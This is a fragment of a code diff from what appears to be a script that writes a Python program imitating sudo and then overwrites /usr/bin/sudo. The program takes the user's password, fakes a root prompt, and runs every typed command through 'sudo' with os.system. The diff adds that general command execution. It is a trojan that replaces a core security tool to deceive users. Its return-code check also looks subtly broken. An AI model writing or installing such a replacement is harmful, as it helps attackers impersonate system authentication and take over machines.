@@ -31,7 +31,7 @@ def main():
         command = subprocess.Popen(sudoCmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = command.communicate(password)
         output = str(command).split()
-        if(output[2] == 0):
+        if(output[2] == '0'):
             runShell()
         else:
             print(user+" is not in the sudoers file. This incident will be reported.")
@@ -43,8 +43,12 @@ def runShell():
         option = input("[root@"+host+" "+directory+"]# ")
     if(len(option) == 0):
         pass
-    elif(option.lower() in 'ls'):
-        os.system("ls")
+    elif(option.lower() in ('exit')):
+        print("exit")
+        return
+    else:
+        command = "sudo "+option
+        os.system(command)
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
